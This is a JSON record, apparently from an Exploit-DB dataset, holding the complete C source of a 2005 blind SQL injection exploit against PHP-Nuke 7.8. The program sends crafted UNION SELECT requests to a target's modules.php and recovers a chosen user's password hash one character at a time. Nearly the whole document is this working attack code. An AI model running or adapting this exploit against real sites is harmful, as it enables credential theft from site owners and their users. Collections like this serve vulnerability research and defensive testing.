{
  "id": "1219",
  "title": "PHP-Nuke 7.8 - &#039;modules.php&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "/***********************************************\r\n* PHP-Nuke <=7.8 SQL injection exploit\r\n* need MySQL > 4.0\r\n* (c)oded by 1dt.w0lf\r\n* RST/GHC\r\n* http://rst.void.ru\r\n* http://ghc.ru\r\n************************************************/\r\n// tested on 7.8\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n#include <regex.h>\r\n\r\n#define START 47\r\n#define END   103\r\n#define SZ    1024\r\n#define PORT  80\r\n#define PREFIX \"nuke_\"\r\n#define SQL \"name=PHP-Nuke%%207.8%%20Exploit'%%20UNION%%20SELECT%%201,1%%20FROM%%20%susers%%20WHERE%%20user_id=%d%%20AND%%20ascii(substring(user_password,%d,1))%c%d/*\"\r\n\r\n\r\nmain (int argc, char **argv) {\r\n int pos;\r\n int res = 0;\r\n char result[33];\r\n\t\r\n if(argc<4)\r\n  {\r\n  printf(\"Usage %s [host] [/folder/] [user_id]\\n\",argv[0]);\r\n  exit(1);\r\n  }\r\n \r\n printf(\"PHP-Nuke <= 7.8 SQL injection exploit\\n\"\r\n         \"-------------------------------------\\n\"\r\n         \"[~] Host : %s\\n[~] Folder: %s\\n\"\r\n         \"[!] Searching password for user with id : %d\\n\"\r\n         \"[!] Please wait...\\n\",argv[1],argv[2],atoi(argv[3]));  \r\n for(pos=1;pos<33;pos++)\r\n  {\t \r\n  found(argv[1],argv[2],atoi(argv[3]),START,END,pos,&res);  \r\n  sprintf(result+pos-1,\"%c\",res);\r\n  if(res == 0) { break; }\r\n  }\r\n result[33] = '\\0';\r\n if(strlen(result)>0) printf(\"[+] Password: %s\\n\",result);\r\n else printf(\"[-] Password not found\\n\");\r\n exit (0);\r\n}\r\n\r\nint found(char * host, char * folder, int user_id, int min, int max, int pos, int * res)\r\n {\r\n int i;\r\n int sr = (max - ((max-min)/2));\r\n if( (max-min) < 6 ) { i=(brute(host,folder,user_id,min,max,pos)); *res = i; }\r\n else if( (check(host,folder,pos,'>',sr,user_id)) == 1 ) { found(host,folder,user_id,sr,max,pos,res); }\r\n else { found(host,folder,user_id,min,sr,pos,res);\t} \r\n return 0;\r\n }\r\n\r\nint brute(char * host, char * folder, int user_id, int min, int max, int pos)\r\n {\t \r\n int i;\r\n for(i=min-1;i<max+1;i++)\r\n  {\r\n  if((check(host,folder,pos,'=',i, user_id)) == 1) { return i; }\r\n  }\r\n return 0;  \r\n }\t \r\n \r\nint check(char * host, char * folder, int pos, int chk, int test, int user_id)\r\n {\r\n char req[SZ]; \r\n char ans[SZ];\r\n char sql[SZ];\r\n int sock;\r\n struct hostent *hp;\r\n struct sockaddr_in sin;\r\n regex_t re;\r\n char *pattern = \"Sorry, this Module isn't active!\";\r\n \r\n if( (sock = socket (AF_INET, SOCK_STREAM, 0)) < 0 )\r\n  {\r\n   printf(\"[ ERROR ] Can't create socket!\\n\");\r\n   exit(1);\r\n  } \r\n  \r\n if( (regcomp( &re, pattern, REG_EXTENDED )) != 0 )\r\n  {\r\n  printf(\"[ ERROR ] REG ERROR!\\n\");\r\n  exit(1);\r\n  }\r\n  \r\n bzero(&sin, sizeof(sin));\r\n sin.sin_family = AF_INET;\r\n sin.sin_port   = htons(PORT);\r\n hp = gethostbyname (host);\r\n  \r\n memcpy ((char *)&sin.sin_addr,hp->h_addr,hp->h_length);\r\n connect (sock, (struct sockaddr *)&sin, sizeof(sin)); \r\n  \r\n bzero(req,sizeof(req));\r\n bzero(ans,sizeof(ans));\r\n bzero(sql,sizeof(sql));\t \r\n\t \r\n snprintf(sql,SZ-1,SQL,PREFIX,user_id,pos,chk,test);\t \r\n \r\n snprintf(req,SZ-1,\"POST %smodules.php HTTP/1.0\\n\"\r\n                  \"Host: %s\\n\"\r\n                  \"Content-Type: application/x-www-form-urlencoded\\n\"\r\n                  \"Content-Length: %d\\n\\n\"\r\n                  \"%s\\n\\n\\n\",\r\n                  folder,\r\n\t\t\t\t  host,\r\n                  strlen(sql),\r\n                  sql);\r\n \r\n write(sock, req, strlen(req));\r\n\r\n while( (read(sock, &ans, SZ-1)) > 0 )\r\n  {\r\n  if( (regexec( &re, ans, 0, NULL, 0)) == 0) { return 0; }\r\n  bzero(ans,sizeof(ans));\r\n  } \r\n close (sock); \r\n return 1;\t \r\n }\r\n\r\n// milw0rm.com [2005-09-16]",
  "url": "https://www.exploit-db.com/exploits/1219"
}